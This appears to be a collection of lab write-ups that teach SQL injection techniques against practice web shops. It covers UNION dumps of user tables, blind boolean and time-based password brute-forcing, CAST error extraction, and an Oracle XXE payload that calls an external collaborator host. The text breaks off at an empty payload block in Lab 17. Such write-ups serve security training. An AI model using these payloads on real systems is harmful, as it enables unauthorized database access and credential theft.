### LAB 3 - SQL injection attack, querying the database type and version on Oracle

### Lab Description

![image](https://github.com/user-attachments/assets/a714971e-8a3d-490b-bafa-95a0bbdf26b7)

### Solution

Here we can find out the number of columns that the web app is querying & also determine the columns which have text data but to retreive a column data  we need to know the table name.

> In oracle there is a default table called **DUAL**. Using that we can retreive column data.


For example: UNION SELECT 'abc' FROM dual
We see there are 2 values displayed in the table, the description and the content of the post:

![image](https://github.com/user-attachments/assets/02bc6919-b024-44fe-a576-d03a9fe45771)

### Determine the number of columns 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

**ORDER BY 3** gives error, so there are 2 columns being retreived.

### Determine the column which has text data


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'hanzala','cys' FROM dual --
```
Both the columns show the text in response. So both columns support text data.

### Retreive db type & version of ORACLE 

To retretive db type & version of ORACLE , we have the syntax `SELECT * FROM v$version`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,banner FROM v$version --

```
To display the version we need to execute one of these:
```sql
SELECT banner FROM v$version
SELECT version FROM v$instance

/filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version-- 

```
We got the db info we needed.

### LAB 5 - SQL injection attack, listing the database contents on non-Oracle databases

### Lab Description

![image](https://github.com/user-attachments/assets/1a00d79d-4ddc-4f29-be22-4a910bdafbf3)



### Solution

Most database management systems (e.g., MySQL, PostgreSQL, SQL Server, but **not Oracle**) provide an `information_schema` database containing metadata about the database structure. The `information_schema.tables` view can be queried to list all tables in the database.

### List the database contents

### List tables -

From the information schema tables, there are some default columns.

![image](https://github.com/user-attachments/assets/b09dae92-7c9e-4a0a-a89e-4a95e735f33b)



1. **Verify the Vulnerable Parameter**
   - The `/filter?category=` endpoint is vulnerable to SQL injection.
     
   - Valid payloads to display data:
     - `/filter?category=Gifts'--`: Displays 4 posts in the "Gifts" category.

        ![image](https://github.com/user-attachments/assets/4d611f14-2866-465b-a268-93f396cfc9c3)

     - `/filter?category=Gifts'+or+1=1--`: Displays all items by bypassing the filter.

2. **Determine the Number of Columns**
 

**ORDER BY 3**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3--
```

![image](https://github.com/user-attachments/assets/7802f6b1-3566-4a45-979a-fcdfffcd92f7)


### Determine wich column contains text data

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' SELECT 'abc','def'--
```
Both the columns contain text data.

![image](https://github.com/user-attachments/assets/90208163-fc2b-4161-8b1b-0f4c750b57f9)

 Response

![image](https://github.com/user-attachments/assets/054c619a-4eda-4407-ad5c-00eecac98146)

3. **List Table Names**
   - Query the `information_schema.tables` to retrieve table names:
     - Payload: `/filter?category=Gifts'+union+all+select+'1',TABLE_NAME+from+information_schema.tables--`
     - This returns a list of table names in the database.
    
       ![image](https://github.com/user-attachments/assets/76e3aeb0-02df-4fb6-9d80-7866e7ff9166)

      ![image](https://github.com/user-attachments/assets/e7f9898f-8d13-4a21-a9cc-ab67cf58dcab)

4. **List Columns in the `users_vptjgu` Table**
   - Query the `information_schema.columns` to retrieve column names for the `users_vptjgu` table:
     - SQL Query: `SELECT * FROM information_schema.columns WHERE table_name = 'users_vptjgu'`
     - Payload: `/filter?category=Gifts'+union+all+select+'1',COLUMN_NAME+from+information_schema.columns+WHERE+table_name+=+'users_vptjgu'--`
     - Result: Two columns identified:
       - `username_lvfons`
       - `password_femvin`
      
         ![image](https://github.com/user-attachments/assets/3fccadc8-537e-4f3e-bf84-3052c0fcb2bc)


5. **Retreive information from the columns username_lvfons anmd password_femvin from the `users_vptjgu` Table**
   - Retrieve the contents of the `username_lvfons` and `password_femvin` columns:
     - SQL Query: `SELECT username_lvfons, password_femvin FROM users_vptjgu`
     - Payload: `/filter?category=Gifts'+union+all+select+username_lvfons,password_femvin+from+users_vptjgu--`
     - This payload dumps the usernames and passwords from the `users_vptjgu` table.

   Now we get the username and password of all users.

### Solution


## Initial Observations
- The table displays 2 values:
  1. The description
  2. The content of the post

![image](https://github.com/user-attachments/assets/d071bf01-3e1d-45e1-b838-6d689b5b92be)

### Basic Payloads
These payloads are valid for displaying:
- The 4 posts in Gifts
- All items in the second query

```
/filter?category=Pets'--
/filter?category=Pets'+or+1=1--
```


### Determine number of columns -

Order by 3 throws a error which means there are 2 columns.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

![image](https://github.com/user-attachments/assets/5684093a-49cb-4272-9ae9-669a7470b4ac)



### Determine column with text data

Here we use the `DUAL` table which is by defaut present in ORACLE databse

Both columns have text data

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'abc','def' FROM DUAL--
```
![image](https://github.com/user-attachments/assets/9ca47b44-5980-46b1-84e7-eed80ecc8590)


### Enumerating Tables
List all table names:

```sql
SELECT table_name from all_tables
```

Payload:
```
/filter?category=Pets'+union+all+select+'1',table_name+from+all_tables--
```
![image](https://github.com/user-attachments/assets/929733ea-2df0-4fc6-87e0-c42ee3b99e0b)

**Interesting table found:** `USERS_XWRQEE`





### Enumerating Columns
List columns in the target table:
Payload:
```
/filter?category=Pets'+union+all+select+'1',COLUMN_NAME+from+all_tab_columns+WHERE+table_name='USERS_XWRQEE'--
```


![image](https://github.com/user-attachments/assets/e7396197-50a8-4ccb-b963-1d53ee9005a7)

### LAB 7 - SQL injection UNION attack, determining the number of columns returned by the query

### Lab Description

![image](https://github.com/user-attachments/assets/ae03b5a9-f8ad-48b2-9b52-06c1bbb020aa)

### Solution

## Initial Observations
- The table displays 2 values:
  1. The name
  2. The price of the product
---

We craft the request by adding **UNION** along with **ORDER BY** clause to *find the number of columns that is being used by the query*.

**ORDER BY 1**

```SQL
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 1 --
```

![image](https://github.com/user-attachments/assets/02fafc7c-ab08-48cc-ae65-316157a2b3dd)


**ORDER BY 2**

![image](https://github.com/user-attachments/assets/9d5a1e19-31fd-4823-a449-3c83cb1adc77)


**ORDER BY 3**

![image](https://github.com/user-attachments/assets/e14e88f2-dbe8-48f9-a2c9-256ec11df49e)


**ORDER BY 4**

![image](https://github.com/user-attachments/assets/f62550ea-af17-45be-a00c-0aa8fbb9f657)


This throws an error. It means that there are 3 columns that is being retreived in the query by the web application.

Now as per our given question, we use **UNION SELECT NULL** payload to return an additional column that contains null values.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,NULL,NULL --
```

or

We can also add values instead of using NULL:

```sql
/filter?category=Accessories'+union+all+select+'0','1','2'--

```

### LAB 8 - SQL injection UNION attack, finding a column containing text

### Lab Description

![image](https://github.com/user-attachments/assets/4ef0709e-e36a-44a4-aeb9-4954507f7e4b)

### Solution

Here's the properly formatted markdown (`.md`) version of your SQL injection testing notes:


## Initial Observations
- The table displays 2 visible values:
  1. Product name
  2. Product price

![image](https://github.com/user-attachments/assets/f385f026-f806-42cc-88be-23e27a9c30e4)

## Basic Injection Payloads
These payloads successfully display:
- The 4 items in Accessories category
- All items in the database

```
/filter?category=Accessories'--
/filter?category=Accessories'+or+1=1--
```

## UNION Attack Setup
Determined the query returns 3 columns. Test with(we can also used ORDER BY 4 --):

```
/filter?category=Accessories'+union+all+select+NULL,NULL,NULL--
```

## String Injection Test
Successfully injected test string "Qrc0Pq" in the second column and catgory of product increase from 4 to 5:

```
/filter?category=Accessories'+union+all+select+'0','Qrc0Pq','1234'--
```

### LAB 9 - SQL injection UNION attack, retrieving data from other tables

### Lab Description

![image](https://github.com/user-attachments/assets/7b492e4b-6fc8-40c7-89f2-10ebeef73dbc)

### Solution

#### Determine number of columns

**ORDER BY 3** shows an error , it means the web application retreives 2 columns in the query

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 4 --
```

![image](https://github.com/user-attachments/assets/d21c977a-4b5d-4495-a4e4-d4fa361507f2)

Both column first and second return text

```sql

/filter?category=Gifts'+union+all+select+NULL,NULL--

```

![image](https://github.com/user-attachments/assets/3bbb887e-d737-4e03-8e18-e42851275984)

Since both the columns contain text data, we can retreive username and password from the users table of the database without any concatination method.


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION ALL SELECT username,password FROM users --

```

![image](https://github.com/user-attachments/assets/3c5aa6dd-ae69-46c8-a78b-bdc19646ad91)

Thus we got all the usernames & password stored in the database.
Now we can login as administrator !

### LAB 10 - SQL injection UNION attack, retrieving multiple values in a single column

### Lab Description

![image](https://github.com/user-attachments/assets/99538ee1-8eed-43ea-9945-d9eaa34b3a57)

### Solution

## String Concatenation in SQL Databases

You can concatenate multiple strings to make a single string in SQL. The syntax varies by database system:

| Database    | Command                                               | Notes                          |
|-------------|------------------------------------------------------|--------------------------------|
| **Microsoft** (SQL Server) | `'foo'+'bar'`                                  | Uses + operator               |
| **PostgreSQL** | `'foo'||'bar'`                                   | Uses || operator (no space)     |
| **MySQL**      | `'foo' 'bar'`<br>`CONCAT('foo','bar')`         | Space between strings or CONCAT function |
| **Oracle**     | `'foo'||'bar'`                                   | Uses || operator with spaces   |





Query made - 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

#### Determine the number of columns -

**ORDER BY 3** returns an error, which means there are 2 columns that is retreived by the web app from the db.


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

![image](https://github.com/user-attachments/assets/430f6ab1-8857-4b02-852d-980bb0f6e4b3)


#### Determine which columns contain text data -

Also, that there are 2 columns returned by the query and we can do check which column return 200 when we insert text on it,So that cotains text:

```sql
/filter?category=Gifts'+union+all+select+NULL,NULL--

```

![image](https://github.com/user-attachments/assets/d65bf69d-4374-4fe5-9d5a-99ef1e28d0b6)

 2 columns only contains text

Response

![image](https://github.com/user-attachments/assets/90de8795-b251-4abc-ab03-fc37675bdc8f)



#### Determine the type of database -

![image](https://github.com/user-attachments/assets/20f4049c-c7f5-44e8-8663-0bf9651ff7a3)


Since we know 2nd column is containing text data, we can try to use version command of each database system to identify the type of database present in the backend.

**ORACLE**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,banner FROM v$version --
```

![image](https://github.com/user-attachments/assets/1170d66b-9d2f-4a25-988d-c82f1c94e31f)


500 - SERVER ERROR

**Microsoft**


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,@@version --
```

![image](https://github.com/user-attachments/assets/9c2a9c68-f2c5-4e7c-8f3f-671e07881585)

500 - Server Error

> NOTE - Syntax for findng version is the same for both Microsoft and MYSQL



**PostgreSQL**



```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,version() --
```

![image](https://github.com/user-attachments/assets/7db14f2d-d566-429d-8f38-cc612b850045)


We can confirm that this is an POSTgreSQL db in backend.

![image](https://github.com/user-attachments/assets/f8a0f802-d3a4-4ba8-94a7-d82b4b31d7f4)


#### Retreive multiple values in single column -

For POSTgreSQL , the syntax for string concatination is `'foo'||'bar'`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,username||'-'||password FROM users --
```
Request

### Solution


## Vulnerability Description
A SQL injection vulnerability was identified in the application's cookie-based `TrackingId` parameter. This vulnerability allows an attacker to manipulate SQL queries and extract sensitive data, such as the administrator's password, from the database.


### Initial SQL Injection Test

Request looks like

![image](https://github.com/user-attachments/assets/c8137707-1861-43d2-9d76-fce6faa4a116)

The application displays a "Welcome back!" message when a valid SQL condition is injected into the `TrackingId` cookie parameter.

- **Payload (Successful)**:
  ```
  Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='1;
  ```
  **Result**: "Welcome back!" message appears, indicating the SQL condition `1'='1` evaluates to true.

  ![image](https://github.com/user-attachments/assets/23b3518e-1712-4178-86a1-f6d7fb8ecf32)

- **Payload (Unsuccessful)**:
  ```
  Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='0;
  ```
  **Result**: No "Welcome back!" message, as the SQL condition `1'='0` evaluates to false.

  ![image](https://github.com/user-attachments/assets/3b6cf31b-06c4-4222-b21b-a3d91b69bb24)


This confirms the presence of a SQL injection vulnerability in the `TrackingId` parameter.

If we send the value as  50 ie `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>50)='a`  , we dont get any welcome message which means its not > 50  characters.

![image](https://github.com/user-attachments/assets/f6516cb4-1db1-41e5-99c4-3986f3363859)

Automate this -> 

1. Send request to Intruder
2. Add the password length part [> 1] 
3. Attack type - SNIPER
4. Payload type - Numbers
5. Give number range from 1-50

There is a difference in length at number 20, means that while checking `if length(password) > 20` it FAILS.

So the total **length of password is 20**.


### Password Extraction or Bruteforce the 20 character length password
To extract the administrator's password, the following SQL injection technique was used to test the password character by character.

#### Step 1: Testing the First Letter
To determine if the first letter of the administrator's password is 's', the following payload was used:
```
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='s
```
**Cookie Payload**:
```
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),1,1)='s
```

![image](https://github.com/user-attachments/assets/396cf2c5-44e1-4e1c-b76f-d74727008545)

**Result**: "Welcome back!" message appeared, confirming the first letter of the password is 's'.

![image](https://github.com/user-attachments/assets/f0805747-c418-4336-89a6-cc90a4df8111)




#### Optimization Attempt
An initial attempt to test multiple letters at once (e.g., checking if the first two characters are 'ss'):
```
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,2)='ss
```
**Cookie Payload**:
```
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),1,2)='ss
```
![image](https://github.com/user-attachments/assets/9a89cca8-dca5-44da-937a-7a7b8eb94c8d)

However, testing one character at a time was determined to be more time consuming

#### Step 2: Testing Subsequent Letters of password 
To optimize the process, each character of the password was tested individually using the `SUBSTRING` function. The following payloads were sent to test each position:
```
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),2,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),3,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),4,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),5,1)='a
...
```
This process was repeated for each character position, testing all possible letters until the correct character was identified by the presence of the "Welcome back!" message.
#### Final Result

Arrange the payload number and write the payload2 alphabets (password characters) in order .
By iterating through each character position and testing all possible letters, the administrator's password was retrieved as:
```
ssmyivfjyj5m1bvch02g
```

### Step 1: Identifying SQL Injection
The application processes the `TrackingId` cookie in the following query:

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```

- **Inducing Syntax Error**:
  - Payload: `TrackingId=xyz''`
  - Modified Query: 
    ```sql
    SELECT trackingId FROM someTable WHERE trackingId = 'xyz'''
    ```
  - Result: Error due to invalid SQL syntax (unclosed quote).

  ![image](https://github.com/user-attachments/assets/13ed80f6-ce23-4c00-b630-ee606750e1a7)


- **Valid Syntax Test**:
  - Payload: `TrackingId=xyz'''`
  - Modified Query:
    ```sql
    SELECT trackingId FROM someTable WHERE trackingId = 'xyz'''
    ```
  - Result: HTTP 200 response, indicating valid SQL syntax.

  ![image](https://github.com/user-attachments/assets/3af20140-4844-498e-b4e8-f9cf57360e88)


### Step 2: Confirming Oracle Database
To confirm the database is Oracle, which requires a table in `SELECT` statements:

- **Invalid Subquery**:
  - Payload: `TrackingId=xyz'||(SELECT '')||'`
  - Result: Error, as Oracle requires a table.

![image](https://github.com/user-attachments/assets/2c4aab4a-cde4-4c82-8265-667380a4cccc)


- **Valid Subquery with DUAL**:
  - Payload: `TrackingId=xyz'||(SELECT '' FROM dual)||'`
  - Result: HTTP 200 response, confirming Oracle database.
  
  ![image](https://github.com/user-attachments/assets/05f80d30-b3f0-462c-9461-81b6537903bb)


- **Invalid Table Test**:
  - Payload: `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`
  - Result: Error, confirming the need for a valid table.

![image](https://github.com/user-attachments/assets/97e64a38-7b22-4fbe-9efd-63e4638b34f0)


### Step 3: Verifying Users Table
To check if a `users` table exists:

- Payload: `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
- Result: HTTP 200 response, confirming the `users` table exists.
- Note: `WHERE ROWNUM = 1` ensures a single row to avoid concatenation issues.
 
![image](https://github.com/user-attachments/assets/a4496ca9-b074-4529-b974-5a8de1f573fb)


### Step 4: Verifying Administrator User
To confirm the existence of an `administrator` user:

- **True Condition Test**:
  - Payload: `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
  - Result: Error due to division by zero, confirming true condition triggers an error.

  ![image](https://github.com/user-attachments/assets/e3c6eb48-e12f-465f-a543-94d4cd50d797)


- **False Condition Test**:
  - Payload: `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
  - Result: HTTP 200 response, as false condition returns empty string.

![image](https://github.com/user-attachments/assets/d1d5f787-4511-496e-aa28-2ae4d5ce2d96)


- **Administrator Check**:
  - Payload: 
    ```sql
    TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ```
  - Result: Error, confirming the `administrator` user exists.

![image](https://github.com/user-attachments/assets/be46c74f-ffb0-40c2-982c-f93a808e9f97)


### Step 5: Determining Password Length
To find the length of the administrator's password:

- Payload: 
  ```sql
  TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>N THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  ```
- Method: Used Burp Intruder to test `N` from 1 to 21.
- Result: Error for `LENGTH > 20`, but not for `LENGTH > 21`, indicating the password is **20 characters**.

![image](https://github.com/user-attachments/assets/a4954f39-14fc-4629-a8d4-48a6f5da7415)



### Step 6: Brute-Forcing the Password
To extract the password character by character:

- Payload: 
  ```sql
  TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§N§,1)='§CHAR§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  ```
- Method: Used Burp Intruder with **Cluster Bomb** attack:
  - Payload 1: Position (`N` from 1 to 20).
  - Payload 2: Alphanumeric character set.
- Result: Errors for specific characters at each position, revealing the password: **`8fysuozl95mngaem0abi`**.

![image](https://github.com/user-attachments/assets/5e85ee25-29ba-4a9c-bb10-b34378ad07ca)





### Step 7: Login as Administrator
- Using the password `8fysuozl95mngaem0abi`, successful login as the `administrator` user was achieved.

### LAB 13 - Visible error-based SQL injection

### Lab Description

![image](https://github.com/user-attachments/assets/c1acb5bc-75ae-4b65-bfd0-34f58f0d9a28)

### Solution

## Overview

Database misconfigurations can lead to detailed error messages that expose sensitive information to attackers. For example, injecting a single quote into an `id` parameter may result in:

```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

By triggering errors that reveal query results, attackers can transform a blind SQL injection into a "visible" one. A key technique involves the `CAST()` function, which converts data types. For example:

**Request Payload**:
```sql
CAST((SELECT example_column FROM example_table) AS int)
```

If the data is a string, casting it to an incompatible type like `int` can generate:

**Response**:
```sql
ERROR: invalid input syntax for type integer: "Example data"
```

> **Note**: This approach is particularly useful when character limits prevent conditional responses, allowing data extraction through error messages.

### Step 1: Identifying SQL Injection
When selecting a product category, the application sends a GET request with a `TrackingId` and session cookie.

![image](https://github.com/user-attachments/assets/00b86d7e-5b22-4acd-8941-65c44deba520)


Testing for SQL injection by injecting a single quote:

- **Payload**:
  ```sql
  Cookie: TrackingId=e00R0OKbtGq3H944';
  ```

- **Response**: Error revealing the backend query:
  ```sql
  SELECT * FROM tracking WHERE id = 'e00R0OKbtGq3H944''
  ```
![image](https://github.com/user-attachments/assets/efa7183b-c218-4e68-a85b-9c08e9902a2e)


### Step 2: Crafting CAST-Based Payload
Using `CAST` to induce errors:

- **Payload**:
  ```sql
  TrackingId=hxcQNYCw0qIfVGRe' AND CAST((SELECT 1) AS int)--
  ```

- **Response**: 500 Internal Server Error, indicating the `AND` condition requires a boolean expression.

![image](https://github.com/user-attachments/assets/b80ba310-6377-48a5-90d2-fdb3fcf32921)


- **Modified Payload** (adding boolean comparison):
  ```sql
  TrackingId=hxcQNYCw0qIfVGRe' AND 1=CAST((SELECT 1) AS int)--
  ```

- **Response**: HTTP 200 OK, returning category items, confirming the condition is true.

![image](https://github.com/user-attachments/assets/54c81f43-7e76-494c-a204-e8be7a1ce3b6)

### Step 3: Extracting Username
To retrieve the username from the `users` table:

- **Payload**:
  ```sql
  TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
  ```

- **Response**: 500 Internal Server Error due to query truncation.

![image](https://github.com/user-attachments/assets/8aac2700-95b7-4e3c-9baa-bb4c4dd9d3cc)


- **Optimized Payload** (removing `TrackingId` value and adding `LIMIT 1`):
  ```sql
  TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
  ```

- **Response**: Error revealing the username: `administrator`.

![image](https://github.com/user-attachments/assets/10f30c12-1dd6-4cde-b1f7-d8623c955b6b)

### Step 4: Extracting Password
To retrieve the administrator’s password:

- **Payload**:
  ```sql
  TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
  ```

- **Response**: Error revealing the password: `92xxhtubhmgxhsyhhldk`.

![image](https://github.com/user-attachments/assets/61c938e7-a0f3-4329-84e1-04eb196c4552)

- **Note**: `LIMIT 1` ensures only the first row (administrator’s data) is returned, bypassing the need for `WHERE username='administrator'`.

### Step 5: Administrator Login
- **Credentials**: `administrator:92xxhtubhmgxhsyhhldk`
- **Result**: Successful login to the shopping website.

# Time-Based Blind SQL Injection Testing

This document outlines the process of testing a web application for time-based blind SQL injection vulnerabilities using PostgreSQL's `pg_sleep` function. The steps involve checking for vulnerabilities, confirming the existence of a `users` table, verifying specific columns and data, and enumerating the password for the `administrator` user.

## Prerequisites
- A tool like Burp Suite with Intruder for automating SQL injection payloads.
- Access to a PostgreSQL database vulnerable to SQL injection.
- Basic understanding of SQL injection techniques and time-based delays.

## Step 1: Test for Time-Based SQL Injection Vulnerability

### Objective
Determine if the application is vulnerable to time-based SQL injection by injecting a delay and observing response times.

### Payloads
```sql
COOKIE'||pg_sleep(10)--
jIPoq0qYcS0Y2AmF'||pg_sleep(10)--
```
- **Description**: These payloads append a `pg_sleep(10)` to introduce a 10-second delay if the injection is successful.
- **Result**: If the response takes approximately 10 seconds, the application is vulnerable to time-based SQL injection.

### Verification with Comparison

#### Confirm that blind sql injection works -

Modify the cookie value

Since it is a POSTgreSQL , we use the following syntax

![image](https://github.com/user-attachments/assets/cc54172f-5d25-433c-9abc-3bc720fda974)


To confirm the vulnerability, compare the response times for true (`1=1`) and false (`1=2`) conditions:
```sql
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END
```
- **Encoded Payloads**:
  ```sql
  jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
  jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
  ```
- **Result**:
  - `1=1`: ~10,300 ms (indicating a delay, confirming vulnerability).

   ![image](https://github.com/user-attachments/assets/ef61b3f7-a5e7-4a11-8743-d3b214f66923)

  - `1=2`: No delay (near-instant response).
- **Conclusion**: The application is vulnerable to time-based SQL injection.

## Step 2: Check for Existence of `users` Table

### Objective
Confirm if a `users` table exists in the database.

### Payload
```sql
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users) --
```

![image](https://github.com/user-attachments/assets/3561fa1d-96a4-4fc9-800d-51ebbbded07d)

- **Description**: Attempts to select from the `users` table. If it exists, a 10-second delay is triggered.
- **Result**: ~20,307 ms (indicating the `users` table exists).

   

- **Conclusion**: The `users` table exists in the database.

## Step 3: Verify `username` Column and `administrator` User

### Objective
Check if the `username` column exists in the `users` table and if there is an `administrator` user.

### Payload
```sql
' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users) --
```
![image](https://github.com/user-attachments/assets/e7df4a35-0ab8-44df-bd5e-4819e60118d9)


- **Description**: Queries the `users` table for a row where `username='administrator'`. A 10-second delay indicates the user exists.
- **Result**: ~10,292 ms (indicating the `username` column and `administrator` user exist).
- **Conclusion**: The `username` column exists, and there is an `administrator` user.

## Step 4: Check for `password` Column

### Objective
Verify if the `password` column exists in the `users` table.

### Payload
```sql
' || (SELECT CASE WHEN (COUNT(*)>0) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users) --
```

 ![image](https://github.com/user-attachments/assets/e55f747e-760d-4c76-9eed-d46025d280cc)

- **Description**: Checks if there are any rows in the `users` table, implying the existence of columns (including `password`). A 10-second delay confirms the presence of data.
- **Result**: ~10,295 ms (indicating the `password` column exists).
- **Conclusion**: The `password` column exists in the `users` table.

## Step 5: Enumerate Password Length for `administrator`

### Objective
Determine the length of the `administrator` user's password.

### Payload
```sql
' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=FUZZ) THEN pg_sleep(20) ELSE pg_sleep(-1) END FROM users) --
```

- **Description**: Uses a fuzzing approach to test different password lengths (`FUZZ`). A 10-second delay indicates the correct length.
- **Initial Test**: Testing with `LENGTH(password)=1` resulted in a 30-second delay, suggesting the password length is not 1. Modified the `ELSE` clause to `pg_sleep(-1)` for faster enumeration.

![image](https://github.com/user-attachments/assets/ea7620d7-12eb-425a-b464-05fa538ffa93)

- **Automation**:
  - Sent to Burp Suite Intruder.

    ![image](https://github.com/user-attachments/assets/6601d4ae-f99e-4c9b-abc9-64eb7a12f453)

  - Configured payload to test integer values for `FUZZ` (e.g., 1 to 30).
  
    ![image](https://github.com/user-attachments/assets/411eff8d-3368-433e-9e2f-b0886e835f02)

  - Launched attack and observed a 10-second delay for `LENGTH(password)=20`.

    ![image](https://github.com/user-attachments/assets/28d0e740-72d0-4cd6-8507-5ff17c049e90)

- **Result**: Password length is 20 characters.
- **Conclusion**: The `administrator` password is 20 characters long.

## Step 6: Enumerate the Password

### Objective
Extract the `administrator` password character by character.

### Payload
```sql
SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END
jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```


- **Description**: Tests each character of the password by checking if the substring matches a specific character (e.g., `'a'`). A 10-second delay indicates a match.
- **Automation**:
  - Sent to Burp Suite Intruder.
  
    ![image](https://github.com/user-attachments/assets/c342c85d-c06a-4318-8806-f951da7583ec)

  - Configured payload to test characters (e.g., `a-z`, `0-9`) for each position (1 to 36).

     ![image](https://github.com/user-attachments/assets/a15dab4e-bcb9-49b0-ba4b-2ec653c6374d)

  - Continued character by character until the password was fully enumerated.

### LAB 16 - Blind SQL injection with out-of-band interaction

### Lab Description

![image](https://github.com/user-attachments/assets/1fc90fa9-efdd-4b3b-983b-c81474c9f3cc)

### Solution

We don't know which database we are dealing with , so we try all the payloads for each databases given in cheatsheat.

![image](https://github.com/user-attachments/assets/dd91c0c1-e67f-412a-9fcb-074756ab6bb0)


First we start with ORACLE db,

Open burp collaborator client, copy one of the domain provided to clipbopard,

![image](https://user-images.githubusercontent.com/67383098/235473410-2fbcfcda-6aa3-4d9e-93ac-7159d6764ef8.png)

Use the payload 

```sql
' union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

So the query would made to db would look like this ,

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

This triggers a DNS request to our collaborater server, and once we get a `200 OK` response, if we click `Poll Now` button in Burp Collaborator, we get **4 DNS requests**

### LAB 17 - Blind SQL injection with out-of-band data exfiltration

### Lab Description

![image](https://github.com/user-attachments/assets/afead458-31b5-439d-a2a9-f2a7abcec26a)

### Overview

The process of exploiting an out-of-band (OAST) SQL injection vulnerability in a web application using PostgreSQL's EXTRACTVALUE and XML external entity (XXE) techniques to interact with a collaborator server (e.g., Burp Collaborator or OASTify). The goal is to confirm the vulnerability and extract the administrator user's password from the users table.

### Solution

Cheatsheet to exfiltrate data using OAST technique,

![image](https://github.com/user-attachments/assets/8e58d145-8e79-431d-8a61-69e5dfda5d0f)


#### Step 1: Test for Out-of-Band SQL Injection Vulnerability

**Objective**
Determine if the application is vulnerable to out-of-band SQL injection by triggering an HTTP request to a collaborator server.

**Payload**

```
